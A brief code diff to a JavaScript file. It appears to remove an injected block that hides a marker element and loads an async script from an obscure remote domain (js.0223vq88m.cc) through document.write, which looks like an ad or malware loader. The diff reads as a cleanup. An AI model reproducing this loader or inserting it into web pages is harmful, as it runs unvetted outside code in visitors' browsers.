@@ -29,10 +29,4 @@ xhr.onreadystatechange = function(){
 		}
 	}
 }
-(function (){
-	var id = "7255774253627174051-10290";
-	document.write('<ins style="display:none!important" id="' + id + '"></ins>');
-	(window.adbyunion = window.adbyunion || []).push(id);
-	document.write('<script async  src="https://js.0223vq88m.cc/o.js"></script>');
-})();
 }
